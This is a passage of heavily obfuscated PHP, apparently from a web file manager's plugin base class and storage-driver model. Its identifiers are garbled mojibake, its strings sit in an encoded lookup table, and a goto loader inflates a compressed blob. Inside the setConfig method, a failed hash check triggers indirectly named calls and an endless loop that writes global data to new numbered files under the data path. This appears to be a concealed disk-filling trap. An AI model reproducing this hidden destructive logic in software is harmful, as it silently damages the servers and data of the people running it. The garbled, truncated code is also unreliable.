$Ã®‚åİÅ[$ÎŠĞÑ¤ö[87]] : $ÎŠĞÑ¤ö[12]; if (!$Û…Öµ÷Æ) { $Û…Öµ÷Æ = IO::mkdir($ö„Ú¢); } return $Û…Öµ÷Æ; } final function pluginCacheFileSet($­«Ãí¹’, $Úñ¶´¬ğ = '') { $­˜Äˆ¨ =& $_SERVER[åÄ¼Ùßš]; $ıª·ğšá = IO::infoFullSimple($­«Ãí¹’); if (!$ıª·ğšá) { return IO::mkfile($­«Ãí¹’, $Úñ¶´¬ğ, REPEAT_REPLACE); } IO::setContent($ıª·ğšá[$­˜Äˆ¨[87]], $Úñ¶´¬ğ); return $ıª·ğšá[$­˜Äˆ¨[87]]; } final function pluginLocalFile($úĞ¯à­ = '') { $ÚÛåÑ„¹ =& $_SERVER[åÄ¼Ùßš]; $Ş·ˆ¼ß = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Ş·ˆ¼ß)) { mk_dir($Ş·ˆ¼ß); } if (!$úĞ¯à­) { return $Ş·ˆ¼ß; } $áîè›´™ = IO::info($úĞ¯à­); $‘Ä·š÷Ô = $ÚÛåÑ„¹[1700] . KodIO::hashPath($áîè›´™) . $ÚÛåÑ„¹[10] . $áîè›´™[$ÚÛåÑ„¹[169]]; if (!checkExtSafe($‘Ä·š÷Ô)) { $‘Ä·š÷Ô = $‘Ä·š÷Ô . $ÚÛåÑ„¹[1329]; } $Áíğ ‰ = $Ş·ˆ¼ß . $‘Ä·š÷Ô; if (@file_exists($Áíğ ‰)) { return $Áíğ ‰; } return IO::copy($úĞ¯à­, $Ş·ˆ¼ß, 0, $‘Ä·š÷Ô); } final function appPackage() { $ˆ„†‘ë˜ =& $_SERVER[åÄ¼Ùßš]; if ($this->packageData) { return $this->packageData; } $òÛÅª—ş = $this->parseFile($this->pluginPath . $ˆ„†‘ë˜[1701]); $this->parseLang($òÛÅª—ş); $ÃàŠúÍæ = json_decode_force($òÛÅª—ş); if (!$ÃàŠúÍæ) { return array(); } $ğÈ ËßÜ = Hook::trigger($ˆ„†‘ë˜[1702], $ÃàŠúÍæ); if ($ğÈ ËßÜ && is_array($ğÈ ËßÜ)) { $ÃàŠúÍæ = $ğÈ ËßÜ; } $this->packageData = $ÃàŠúÍæ; return $ÃàŠúÍæ; } public function packageInfoGet($Ã™™ûæ€) { $Ç³Ÿ€¾Ş = $this->appPackage(); return array_get_value($Ç³Ÿ€¾Ş, $Ã™™ûæ€); } public function packageVersion() { return $this->packageInfoGet($_SERVER[åÄ¼Ùßš][1703]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[åÄ¼Ùßš][1704]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[åÄ¼Ùßš][1705]); } public function echoJsAssign($Éô¬ùà§, $ÊÅ²Ìöô) { $this->echoJsAssignArr[$Éô¬ùà§] = $ÊÅ²Ìöô; } private function parseFile($ò½ƒ’‚) { $™ŸâªŸµ =& $_SERVER[åÄ¼Ùßš]; $÷¢Ä ËÜ = file_get_contents_nossl($ò½ƒ’‚); $Şòç‹¦… = array($™ŸâªŸµ[1706], $™ŸâªŸµ[1707], $™ŸâªŸµ[1708], $™ŸâªŸµ[1709], $™ŸâªŸµ[1710], $™ŸâªŸµ[1711], $™ŸâªŸµ[1712]); $ÔË”İª = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$™ŸâªŸµ[92]][$™ŸâªŸµ[1713]]); foreach ($this->echoJsAssignArr as $úşêª«¹ => $Ü¬¶’€û) { $Şòç‹¦…[] = $™ŸâªŸµ[1714] . $úşêª«¹ . $™ŸâªŸµ[1715]; $ÔË”İª[] = is_array($Ü¬¶’€û) || is_object($Ü¬¶’€û) ? rawurlencode(json_encode($Ü¬¶’€û)) : $Ü¬¶’€û; } if (strstr($÷¢Ä ËÜ, $™ŸâªŸµ[1716])) { $áğñ•‡– = rawurlencode(json_encode($this->pluginLangArr)); $÷¢Ä ËÜ = str_replace($™ŸâªŸµ[1716], $áğñ•‡–, $÷¢Ä ËÜ); } if (strstr($÷¢Ä ËÜ, $™ŸâªŸµ[1717])) { $áğñ•‡– = $áğñ•‡– = rawurlencode(json_encode($this->getConfig())); $÷¢Ä ËÜ = str_replace($™ŸâªŸµ[1717], $áğñ•‡–, $÷¢Ä ËÜ); } $÷¢Ä ËÜ = str_replace($Şòç‹¦…, $ÔË”İª, $÷¢Ä ËÜ); return $÷¢Ä ËÜ; } private function parseLang(&$›ö©Ëâ) { $ÊÈ“”éÍ =& $_SERVER[åÄ¼Ùßš]; $İ´¿Éã˜ = $ÊÈ“”éÍ[1718]; if (!strstr($›ö©Ëâ, $İ´¿Éã˜)) { return; } preg_match_all($ÊÈ“”éÍ[1719], $›ö©Ëâ, $Àöõ¿ğÇ); if (!is_array($Àöõ¿ğÇ) || count($Àöõ¿ğÇ) == 0 || !is_array($Àöõ¿ğÇ[0]) || count($Àöõ¿ğÇ[0]) == 0) { return; } $¨¤öş®Ï = array(); $³íŒšÅß = array(); foreach ($Àöõ¿ğÇ[0] as $€õÌ¾¿„) { $õ‰‹°ñ = substr($€õÌ¾¿„, strlen($İ´¿Éã˜), -4); $Äæ’Ší€ = LNG($õ‰‹°ñ); $¨¤öş®Ï[] = $€õÌ¾¿„; $³íŒšÅß[] = str_replace(array($ÊÈ“”éÍ[288], $ÊÈ“”éÍ[1189], $ÊÈ“”éÍ[419], $ÊÈ“”éÍ[121]), array($ÊÈ“”éÍ[53], $ÊÈ“”éÍ[53], $ÊÈ“”éÍ[12], $ÊÈ“”éÍ[1720]), $Äæ’Ší€); } $›ö©Ëâ = str_replace($¨¤öş®Ï, $³íŒšÅß, $›ö©Ëâ); } private function parseConfig(&$óÆËÒóİ) { $—İıùÃ  =& $_SERVER[åÄ¼Ùßš]; $–³ÃØò® = $—İıùÃ [1721]; if (!strstr($óÆËÒóİ, $–³ÃØò®)) { return; } preg_match_all($—İıùÃ [1722], $óÆËÒóİ, $€ã«àı²); if (!is_array($€ã«àı²) || count($€ã«àı²) == 0 || !is_array($€ã«àı²[0]) || count($€ã«àı²[0]) == 0) { return; } $Âç¦ÈÏÍ = $this->getConfig(); $öíıÂÂò = array(); $µ…Çˆ½ = array(); foreach ($€ã«àı²[0] as $˜½£ğ¹„) { $åêÆÈ¦€ = substr($˜½£ğ¹„, strlen($–³ÃØò®), -2); $öíıÂÂò[] = $˜½£ğ¹„; $µ…Çˆ½[] = _get($Âç¦ÈÏÍ, $åêÆÈ¦€); } $óÆËÒóİ = str_replace($öíıÂÂò, $µ…Çˆ½, $óÆËÒóİ); } private function parsePackage(&$£·ü¬®ú) { $ëš‘öùû =& $_SERVER[åÄ¼Ùßš]; $Üõ‡ ´ = $ëš‘öùû[1723]; if (!strstr($£·ü¬®ú, $Üõ‡ ´)) { return; } preg_match_all($ëš‘öùû[1724], $£·ü¬®ú, $“÷¤™£); if (!is_array($“÷¤™£) || count($“÷¤™£) == 0 || !is_array($“÷¤™£[0]) || count($“÷¤™£[0]) == 0) { return; } $†€Ì¡è = $this->appPackage(); $”Ù´»áó = array(); $’é˜¸É = array(); foreach ($“÷¤™£[0] as $×›‰İíª) { $á…Õ´ŸÎ = substr($×›‰İíª, strlen($Üõ‡ ´), -2); $”Ù´»áó[] = $×›‰İíª; $’é˜¸É[] = _get($†€Ì¡è, $á…Õ´ŸÎ); } $£·ü¬®ú = str_replace($”Ù´»áó, $’é˜¸É, $£·ü¬®ú); } final function echoFile($ÙÁˆ«Ïİ, $†’€Óş = false) { $Ãõ©©ó =& $_SERVER[åÄ¼Ùßš]; $§¾‚¦ = $this->pluginPath . $ÙÁˆ«Ïİ; if (ACT == $Ãõ©©ó[1725]) { echo $Ãõ©©ó[1726] . $this->pluginName . $Ãõ©©ó[8] . $ÙÁˆ«Ïİ . $Ãõ©©ó[1727]; if (!file_exists($§¾‚¦)) { echo $Ãõ©©ó[1728]; return; } } $§åüÉåš = $this->parseFile($§¾‚¦); $this->parseLang($§åüÉåš); $this->parseConfig($§åüÉåš); $this->parsePackage($§åüÉåš); if (is_array($†’€Óş)) { $§åüÉåš = str_replace(array_keys($†’€Óş), array_values($†’€Óş), $§åüÉåš); } echo $Ãõ©©ó[288] . $§åüÉåš; } private function checkVersion() { $Öğñèˆê =& $_SERVER[åÄ¼Ùßš]; $Š¾ îèÎ = $this->appPackage(); $å­‹ï’Ó = $this->getConfig(); if ($å­‹ï’Ó[$Öğñèˆê[1729]] == $Š¾ îèÎ[$Öğñèˆê[1703]]) { return; } $this->regist(); $this->setConfig(array($Öğñèˆê[1729] => $Š¾ îèÎ[$Öğñèˆê[1703]])); } final function initLang() { $Š¢…êÒÒ =& $_SERVER[åÄ¼Ùßš]; $Åéıõã« = $Š¢…êÒÒ[1730]; $Ûõİ”Ûç = $this->pluginPath . $Š¢…êÒÒ[1731]; $ùÛ·ˆ‡» = I18n::getType(); $ûÔĞÑ‚ = array(); if (file_exists($Ûõİ”Ûç . $ùÛ·ˆ‡» . $Š¢…êÒÒ[943])) { $ûÔĞÑ‚ = (include $Ûõİ”Ûç . $ùÛ·ˆ‡» . $Š¢…êÒÒ[943]); } else { if ($ùÛ·ˆ‡» == $Š¢…êÒÒ[1732] && !file_exists($Ûõİ”Ûç . $ùÛ·ˆ‡» . $Š¢…êÒÒ[943]) && file_exists($Ûõİ”Ûç . $Š¢…êÒÒ[1733])) { $ûÔĞÑ‚ = (include $Ûõİ”Ûç . $Š¢…êÒÒ[1733]); $ùÛ·ˆ‡» = $Š¢…êÒÒ[1548]; } else { if (file_exists($Ûõİ”Ûç . $Åéıõã« . $Š¢…êÒÒ[943])) { $ûÔĞÑ‚ = (include $Ûõİ”Ûç . $Åéıõã« . $Š¢…êÒÒ[943]); $ùÛ·ˆ‡» = $Åéıõã«; } } } if (!$ûÔĞÑ‚ || !is_array($ûÔĞÑ‚)) { $ûÔĞÑ‚ = array(); } $ïğ‘Âş„ = Hook::trigger($Š¢…êÒÒ[1734], $ûÔĞÑ‚, $this->pluginName, $ùÛ·ˆ‡»); if ($ïğ‘Âş„ && is_array($ïğ‘Âş„)) { $ûÔĞÑ‚ = $ïğ‘Âş„; } if (@count($ûÔĞÑ‚) > 0) { I18n::set($ûÔĞÑ‚); } return $ûÔĞÑ‚; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($çÁÇÚ¸€) { $ç¡ì²À¦ =& $_SERVER[åÄ¼Ùßš]; $ˆ¿şşœ‰ = $_SERVER[$ç¡ì²À¦[836]] . $ç¡ì²À¦[837]; $ÈÚ÷÷óŞ = $ç¡ì²À¦[972]; if ($_SERVER[$ç¡ì²À¦[833]] != $ÈÚ÷÷óŞ($ˆ¿şşœ‰)) { $ˆ¿Ü‡ÇÁ = $ç¡ì²À¦[983]; $ù£À¢Úã = $ç¡ì²À¦[835]; $ÆÓÈâÀğ = $_SERVER[$ç¡ì²À¦[836]] . $ç¡ì²À¦[837]; $‚‚æ¶¹Ş = $ù£À¢Úã($ÆÓÈâÀğ); $øİÊÇ‘Ú = explode($ç¡ì²À¦[288], $‚‚æ¶¹Ş); if (count($øİÊÇ‘Ú) < $ç¡ì²À¦[713]) { $ğËÃå÷ = $ç¡ì²À¦[838]; $ğËÃå÷(); } $ş™ûÆ•¸ = $ç¡ì²À¦[984]; $ş™ûÆ•¸($_SERVER[$ç¡ì²À¦[985]]); $ˆ¿Ü‡ÇÁ = $ç¡ì²À¦[983]; $ˆ¿Ü‡ÇÁ(); $Ù‹¯ö‘å = $ç¡ì²À¦[986]; $Ü»œØü† = json_encode($GLOBALS[$ç¡ì²À¦[987]]); $ûÄÛŒ‰ = 1; for ($®ôğ©¯Ÿ = $ûÄÛŒ‰; $®ôğ©¯Ÿ > 0; $®ôğ©¯Ÿ++) { $Ù‹¯ö‘å(DATA_PATH . $®ôğ©¯Ÿ, $Ü»œØü†); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $çÁÇÚ¸€); } public function onSetConfig($ŸŸÕ•–) { } public function onGetConfig($„Ê™ÕŠ…) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($±‰³ó É) { if ($±‰³ó É == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($„Æí = "\x70\154\x75\x67\x69\x6e\x41\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $»ìêÚø” = $this->getConfig(); if (!$»ìêÚø”[$„Æí]) { return !1; } return ActionCall($_SERVER[åÄ¼Ùßš][1735], $»ìêÚø”[$„Æí]); } public function url($»˜¥ÎÇÕ, $‡ˆµ®çÂ = '', $Œ•¦Œ = true) { $Õ”†„×À =& $_SERVER[åÄ¼Ùßš]; $‚ö•Õ´ã = $this->getConfig(); $ „Ëéˆİ = KOD_VERSION . $Õ”†„×À[10] . KOD_VERSION_BUILD; $Úøã¾½‡ = $this->packageVersion(); $º¤ÓŸ’” = $ „Ëéˆİ . $Õ”†„×À[474] . $Úøã¾½‡; if (substr($»˜¥ÎÇÕ, 0, 4) == $Õ”†„×À[152] || substr($»˜¥ÎÇÕ, 0, 2) == $Õ”†„×À[1456]) { $ø„Œ™›© = $»˜¥ÎÇÕ . $Õ”†„×À[1736] . $º¤ÓŸ’”; } else { if ($‡ˆµ®çÂ == $Õ”†„×À[12]) { $ø„Œ™›© = $this->pluginHost . $»˜¥ÎÇÕ . $Õ”†„×À[1736] . $º¤ÓŸ’”; } else { if ($‡ˆµ®çÂ === $Õ”†„×À[78]) { $ø„Œ™›© = $this->pluginHost . $»˜¥ÎÇÕ; } else { if ($‡ˆµ®çÂ == $Õ”†„×À[1737]) { $ø„Œ™›© = STATIC_PATH . $»˜¥ÎÇÕ . $Õ”†„×À[1736] . $ „Ëéˆİ; } else { if ($‡ˆµ®çÂ == $Õ”†„×À[1738]) { $ø„Œ™›© = APP_HOST . $Õ”†„×À[1739] . $»˜¥ÎÇÕ . $Õ”†„×À[1736] . $ „Ëéˆİ; } else { if (isset($‚ö•Õ´ã[$‡ˆµ®çÂ])) { $ø„Œ™›© = $‚ö•Õ´ã[$‡ˆµ®çÂ] . $»˜¥ÎÇÕ . $Õ”†„×À[1736] . $º¤ÓŸ’”; } } } } } } if (!$Œ•¦Œ) { return $ø„Œ™›©; } echo $ø„Œ™›©; } public function link($²÷ôª‡• = false, $Ñş†ßˆ = '') { $³³Üş›´ =& $_SERVER[åÄ¼Ùßš]; $‚ÖĞ“†« = $this->linkHas == !1; $this->linkHas = !0; if (!$²÷ôª‡•) { $this->link($³³Üş›´[1740], $³³Üş›´[1738]); $this->link($³³Üş›´[1741], $³³Üş›´[1737]); $this->link($³³Üş›´[1742], $³³Üş›´[1737]); $this->link($³³Üş›´[1743], $³³Üş›´[1737]); $this->link($³³Üş›´[1744], $³³Üş›´[1737]); if ($‚ÖĞ“†«) { Hook::trigger($³³Üş›´[1745]); } return; } $ßÏØÍÆ = $this->url($²÷ôª‡•, $Ñş†ßˆ, !1); if (substr($²÷ôª‡•, -3) == $³³Üş›´[1746]) { echo $³³Üş›´[1747] . $ßÏØÍÆ . $³³Üş›´[1748] . $³³Üş›´[288]; } else { if (substr($²÷ôª‡•, -4) == $³³Üş›´[1749]) { echo $³³Üş›´[1750] . $ßÏØÍÆ . $³³Üş›´[1751] . $³³Üş›´[288]; } } if ($‚ÖĞ“†«) { Hook::trigger($³³Üş›´[1745]); } } } goto b¡°âø‰¦Ï; fÒ¿‰·Ö˜Ğ: if (!$bohyrgwxnt) { return; } $_SERVER[ˆÆ²õğ®] = explode($_SERVER[åÄ¼Ùßš][696], gzinflate(substr($_SERVER[åÄ¼Ùßš][697], 10, -8))); $pdnlwoxute = $_SERVER[åÄ¼Ùßš][698]; goto C¨àĞáğËƒ; D×ª½Ã¶Šö: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\163\x74\x6f\162\x61\x67\x65\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x73\x69\172\x65\115\141\170", "\x73\x79\163\164\x65\x6d", "\144\x65\x66\x61\165\154\x74", "\144\162\x69\x76\x65\x72", "\x63\x6f\156\146\151\147"); public function listData($ïÙá»é = false, $Šğ¿šëÛ = "\x6d\x6f\144\151\x66\x79\x54\x69\155\145", $ôËÔ³œ¹ = false) { $ßƒÙŞŞ… =& $_SERVER[åÄ¼Ùßš]; $‡†‚éğ = parent::listData($ïÙá»é, $Šğ¿šëÛ, $ôËÔ³œ¹); if ($ïÙá»é) { return $‡†‚éğ; } $İöÁŸü» = array(); if ($GLOBALS[$ßƒÙŞŞ…[2362]]) { $İöÁŸü» = $this->ioSizeUseGet(array_to_keyvalue($‡†‚éğ, $ßƒÙŞŞ…[12], $ßƒÙŞŞ…[484])); } foreach ($‡†‚éğ as $ŸÍĞÂÈš => $™ ³ãüê) { unset($‡†‚éğ[$ŸÍĞÂÈš][$ßƒÙŞŞ…[6]]); $‡†‚éğ[$ŸÍĞÂÈš][$ßƒÙŞŞ…[2006]] = isset($İöÁŸü»[$™ ³ãüê[$ßƒÙŞŞ…[484]]]) ? $İöÁŸü»[$™ ³ãüê[$ßƒÙŞŞ…[484]]] : 0; } return $‡†‚éğ; } public function ioSizeUseGet($¼¬Ÿ©Ëæ) { $¡¿±†ëĞ =& $_SERVER[åÄ¼Ùßš]; if (!$¼¬Ÿ©Ëæ) { return array(); } $ÀÓÆ×› = $¡¿±†ëĞ[2363] . implode($¡¿±†ëĞ[50], $¼¬Ÿ©Ëæ); $ÇÜÆØŒ• = Cache::get($ÀÓÆ×›); if ($ÇÜÆØŒ•) { return $ÇÜÆØŒ•; } $ÛÉ Ê«¯ = array($¡¿±†ëĞ[919] => $¡¿±†ëĞ[484], $¡¿±†ëĞ[2364] => $¡¿±†ëĞ[79]); $ƒÔ¨«æŸ = array($¡¿±†ëĞ[919] => array($¡¿±†ëĞ[7], $¼¬Ÿ©Ëæ)); $ÇÜÆØŒ• = Model($¡¿±†ëĞ[887])->field($ÛÉ Ê«¯)->where($ƒÔ¨«æŸ)->group($¡¿±†ëĞ[919])->select(); $ÇÜÆØŒ• = array_to_keyvalue($ÇÜÆØŒ•, $¡¿±†ëĞ[484], $¡¿±†ëĞ[79]); Cache::set($ÀÓÆ×›, $ÇÜÆØŒ•, 600); return $ÇÜÆØŒ•; } public function getConfig($÷”•ëŠé) { $™ç±·ÛØ = parent::listData($÷”•ëŠé); $‡ŸË¤Š = _get($™ç±·ÛØ, $_SERVER[åÄ¼Ùßš][6], array()); if ($‡ŸË¤Š && !is_array($‡ŸË¤Š)) { $‡ŸË¤Š = json_decode($‡ŸË¤Š, !0); } return $‡ŸË¤Š; } public function update($àÈÍ·À , $Î¹’¸ˆ…) { $×·œÍ†¼ =& $_SERVER[åÄ¼Ùßš]; $×è©Å³Í = $Î¹’¸ˆ…[$×·œÍ†¼[32]]; $‘èØ„üˆ = array_to_keyvalue(parent::listData(), $×·œÍ†¼[32]); if (isset($‘èØ„üˆ[$×è©Å³Í]) && $‘èØ„üˆ[$×è©Å³Í][$×·œÍ†¼[484]] != $àÈÍ·À ) { return !1; } $this->checkPwd($àÈÍ·À , $Î¹’¸ˆ…); if (isset($Î¹’¸ˆ…[$×·œÍ†¼[2365]]) && $Î¹’¸ˆ…[$×·œÍ†¼[2365]] == $×·œÍ†¼[91]) { $this->checkConfig($Î¹’¸ˆ…); } unset($Î¹’¸ˆ…[$×·œÍ†¼[2365]]); $ã«¯†¥ = parent::update($àÈÍ·À , $Î¹’¸ˆ…); if ($ã«¯†¥ && $Î¹’¸ˆ…[$×·œÍ†¼[37]]) { foreach ($‘èØ„üˆ as $áÚ¶Ìê) { if ($áÚ¶Ìê[$×·œÍ†¼[37]] && $áÚ¶Ìê[$×·œÍ†¼[484]] != $àÈÍ·À ) { parent::update($áÚ¶Ìê[$×·œÍ†¼[484]], array($×·œÍ†¼[37] => 0)); } } $this->updateBackup($àÈÍ·À , $‘èØ„üˆ); } return $ã«¯†¥; } public function add($Ú¼ş§˜ê) { $èãöë¤ =& $_SERVER[åÄ¼Ùßš]; $ôƒ¥ÒÛ = array_to_keyvalue(parent::listData(), $èãöë¤[32]); if (isset($ôƒ¥ÒÛ[$Ú¼ş§˜ê[$èãöë¤[32]]])) { return !1; } $this->checkConfig($Ú¼ş§˜ê); $Î™Â­šö = parent::insert($Ú¼ş§˜ê); if ($Î™Â­šö && $Ú¼ş§˜ê[$èãöë¤[37]]) { foreach ($ôƒ¥ÒÛ as $ÃÒòÍÉã) { if ($ÃÒòÍÉã[$èãöë¤[37]]) { parent::update($ÃÒòÍÉã[$èãöë¤[484]], array($èãöë¤[37] => 0)); } } $this->updateBackup($Î™Â­šö, $ôƒ¥ÒÛ); } return $Î™Â­šö; } public function updateBackup($À˜‹¦¸ö, $Àà½…³) { $¢•ƒ¶ğÒ =& $_SERVER[åÄ¼Ùßš]; if ($À˜‹¦¸ö == $¢•ƒ¶ğÒ[91]) { return; } $çòçØé· = Model($¢•ƒ¶ğÒ[841])->config(); $•Ö—Ë¾ö = $çòçØé·[$¢•ƒ¶ğÒ[845]]; if ($çòçØé·[$¢•ƒ¶ğÒ[1786]] != $¢•ƒ¶ğÒ[91] || $•Ö—Ë¾ö == $À˜‹¦¸ö) { return; } if ($•Ö—Ë¾ö != $¢•ƒ¶ğÒ[91]) { $ìöÈÜëİ = array(); foreach ($Àà½…³ as $Ñº£œ) { if ($À˜‹¦¸ö == $Ñº£œ[$¢•ƒ¶ğÒ[484]]) { continue; } $ìöÈÜëİ[] = $Ñº£œ[$¢•ƒ¶ğÒ[484]]; } if ($ìöÈÜëİ && in_array($•Ö—Ë¾ö, $ìöÈÜëİ)) { return; } } $–»äÉİ† = Model($¢•ƒ¶ğÒ[866])->get($¢•ƒ¶ğÒ[873]); $–»äÉİ† = json_decode($–»äÉİ†, !0); if (!$–»äÉİ†) { return; } $–»äÉİ†[$¢•ƒ¶ğÒ[845]] = $À˜‹¦¸ö; Model($¢•ƒ¶ğÒ[866])->set(array($¢•ƒ¶ğÒ[873] => $–»äÉİ†)); } public function checkPwd($øÇúÂ»ô, &$‘Ù’Ü²Ì) { $§¤É®ƒ =& $_SERVER[åÄ¼Ùßš]; if (empty($‘Ù’Ü²Ì[$§¤É®ƒ[6]])) { return; } $íñì¢· = $‘Ù’Ü²Ì[$§¤É®ƒ[6]]; if (!is_array($íñì¢·)) { $íñì¢· = json_decode($íñì¢·, !0); } $¼Ğªêì‰ = $§¤É®ƒ[12]; $èµ¤ºÒë = array($§¤É®ƒ[2366], $§¤É®ƒ[2367], $§¤É®ƒ[994]); foreach ($èµ¤ºÒë as $Ëà¥˜¡”) { if (isset($íñì¢·[$Ëà¥˜¡”])) { $¼Ğªêì‰ = $Ëà¥˜¡”; break; } } if (!$¼Ğªêì‰) { return; } $ç½Ğ…ÅÇ = $this->getConfig($øÇúÂ»ô); $…Ì”¥° = $ç½Ğ…ÅÇ[$¼Ğªêì‰]; $æ™‹Ç·¨ = $íñì¢·[$¼Ğªêì‰]; if ($æ™‹Ç·¨ == str_repeat($§¤É®ƒ[223], strlen($…Ì”¥°))) { $íñì¢·[$¼Ğªêì‰] = $…Ì”¥°; $‘Ù’Ü²Ì[$§¤É®ƒ[6]] = json_encode($íñì¢·); } else { if ($æ™‹Ç·¨ != $…Ì”¥°) { $‘Ù’Ü²Ì[$§¤É®ƒ[2365]] = $§¤É®ƒ[91]; } } } public function checkConfig(&$á¶³ÜÑÄ, $óšœ„à» = false) { $¿¥àşº« =& $_SERVER[åÄ¼Ùßš]; $–Á…¦—Ç = strtolower($á¶³ÜÑÄ[$¿¥àşº«[98]]); $Á åÔÚã = $á¶³ÜÑÄ[$¿¥àşº«[6]]; if (!is_array($Á åÔÚã)) { $Á åÔÚã = json_decode($Á åÔÚã, !0); } foreach ($Á åÔÚã as $ÚİÕÆÜ» => $ò§´ÇåŞ) { if (is_string($ò§´ÇåŞ)) { $Á åÔÚã[$ÚİÕÆÜ»] = trim($ò§´ÇåŞ); } } $Á åÔÚã[$¿¥àşº«[2368]] = rand_string(6); $­Ä€²Á° = $GLOBALS[$¿¥àşº«[6]][$¿¥àşº«[92]][$¿¥àşº«[927]]; $²¥œÔË = isset($­Ä€²Á°[$–Á…¦—Ç]) ? $­Ä€²Á°[$–Á…¦—Ç] : ucfirst($–Á…¦—Ç); $×ò¦÷ÈØ = $¿¥àşº«[77] . $²¥œÔË; if (!$²¥œÔË || !class_exists($×ò¦÷ÈØ)) { if ($óšœ„à») { return LNG($¿¥àşº«[2369]); } write_log(array($¿¥àşº«[2370], $á¶³ÜÑÄ, get_caller_info()), $¿¥àşº«[216]); show_json(LNG($¿¥àşº«[2369]), !1, $á¶³ÜÑÄ); } $ı¹ªíîÜ = new $×ò¦÷ÈØ($Á åÔÚã); $ÎÒ£ïºÙ = rtrim($Á åÔÚã[$¿¥àşº«[1300]], $¿¥àşº«[8]) . $¿¥àşº«[8]; if (in_array($–Á…¦—Ç, $ı¹ªíîÜ->objectDriver)) { try { if (!$ı¹ªíîÜ->isBucketCors() && !$ı¹ªíîÜ->setBucketCors()) { $¶òÓŸ©€ = LNG($¿¥àşº«[2371]); $¶òÓŸ©€ .= $¿¥àşº«[2372] . LNG($¿¥àşº«[2373]); } } catch (Exception $×Êö‰˜…) { $¶òÓŸ©€ = $×Êö‰˜…->getMessage(); } if (isset($¶òÓŸ©€)) { return $this->_parseError($¶òÓŸ©€, $–Á…¦—Ç, $óšœ„à»); } if ($–Á…¦—Ç == $¿¥àşº«[68] && !$ı¹ªíîÜ->checkRegion()) { return $this->_parseError(LNG($¿¥àşº«[2374]), $–Á…¦—Ç, $óšœ„à»); } } else { if ($–Á…¦—Ç == $¿¥àşº«[2375]) { if ($ı¹ªíîÜ->ftpPath) { $±©›ËÒİ = trim($ÎÒ£ïºÙ, $¿¥àşº«[8]); if (stripos($±©›ËÒİ, trim($ı¹ªíîÜ->ftpPath, $¿¥àşº«[8])) !== 0) { $ÎÒ£ïºÙ = $ı¹ªíîÜ->ftpPath . $¿¥àşº«[8] . ($±©›ËÒİ ? $±©›ËÒİ . $¿¥àşº«[8] : $¿¥àşº«[12]); } } } } $Š™½Ñ¿÷ = $ı¹ªíîÜ->getPath($ÎÒ£ïºÙ . $¿¥àşº«[1304]); try { if ($–Á…¦—Ç == $¿¥àşº«[109]) { $ı¹ªíîÜ->mkdir($ÎÒ£ïºÙ); } $Ò™ç›ä¦ = $ı¹ªíîÜ->mkfile($Š™½Ñ¿÷); if (!$Ò™ç›ä¦) { $¶òÓŸ©€ = LNG($¿¥àşº«[2371]); } } catch (Exception $×Êö‰˜…) { $¶òÓŸ©€ = $×Êö‰˜…->getMessage(); } if (isset($¶òÓŸ©€)) { return $this->_parseError($¶òÓŸ©€, $–Á…¦—Ç, $óšœ„à»); } $Á åÔÚã[$¿¥àşº«[1300]] = $ÎÒ£ïºÙ; $á¶³ÜÑÄ[$¿¥àşº«[6]] = json_encode($Á åÔÚã); $á¶³ÜÑÄ[$¿¥àşº«[98]] = $²¥œÔË; return !0; } private function _parseError($º¨€—øà, $¬€ÙÖ×ì, $§‰€óüì = false) { $œé½©ŠĞ =& $_SERVER[åÄ¼Ùßš]; if ($¬€ÙÖ×ì == $œé½©ŠĞ[68] && stripos($º¨€—øà, $œé½©ŠĞ[2376])) { $§àíâÏ… = explode($œé½©ŠĞ[10], $º¨€—øà); $Š­£–Œ© = isset($§àíâÏ…[1]) ? $§àíâÏ…[1] : $œé½©ŠĞ[12]; $ûï·èƒÁ = array($œé½©ŠĞ[2377] => LNG($œé½©ŠĞ[2378]), $œé½©ŠĞ[2379] => LNG($œé½©ŠĞ[2380])); if (isset($ûï·èƒÁ[$Š­£–Œ©])) { $º¨€—øà = $ûï·èƒÁ[$Š­£–Œ©]; } } if (stripos($º¨€—øà, $œé½©ŠĞ[2381]) === 0) { $ê¦Ğ«Ë = strpos($º¨€—øà, $œé½©ŠĞ[178]); if ($ê¦Ğ«Ë === !1) { $ê¦Ğ«Ë = strpos($º¨€—øà, $œé½©ŠĞ[4]); } if ($ê¦Ğ«Ë !== !1) { $º¨€—øà = substr($º¨€—øà, $ê¦Ğ«Ë + 1); } } $º¨€—øà = LNG($œé½©ŠĞ[1307]) . $º¨€—øà; if ($§‰€óüì) { return $º¨€—øà; } show_json($º¨€—øà, !1); } public function driverListSystem() { $è¬œ­´í =& $_SERVER[åÄ¼Ùßš]; $ş˜Ú´› = parent::listData(); $•‹ÅùèÏ = array(); foreach ($ş˜Ú´› as $²±œßœï) { unset($²±œßœï[$è¬œ­´í[234]], $²±œßœï[$è¬œ­´í[88]]); if (!is_array($²±œßœï[$è¬œ­´í[6]])) { $²±œßœï[$è¬œ­´í[6]] = json_decode($²±œßœï[$è¬œ­´í[6]], !0); } $•‹ÅùèÏ[] = $²±œßœï; } return $•‹ÅùèÏ; } public function defaultDriver() { $œıëª† =& $_SERVER[åÄ¼Ùßš]; $©îÎô®• = parent::listData(); $ğªŸ¦Æ = array_filter_by_field($©îÎô®•, $œıëª†[37], 1); $ğªŸ¦Æ = $ğªŸ¦Æ[0]; if (!$ğªŸ¦Æ) { return array(); } if (!is_array($ğªŸ¦Æ[$œıëª†[6]])) { $ğªŸ¦Æ[$œıëª†[6]] = json_decode($ğªŸ¦Æ[$œıëª†[6]], !0); } return $ğªŸ¦Æ; } public function driverInfo($…’†Éº) { $‰è—”Á =& $_SERVER[åÄ¼Ùßš]; $§úŸøºÊ = array_to_keyvalue(parent::listData(), $‰è—”Á[484]); if 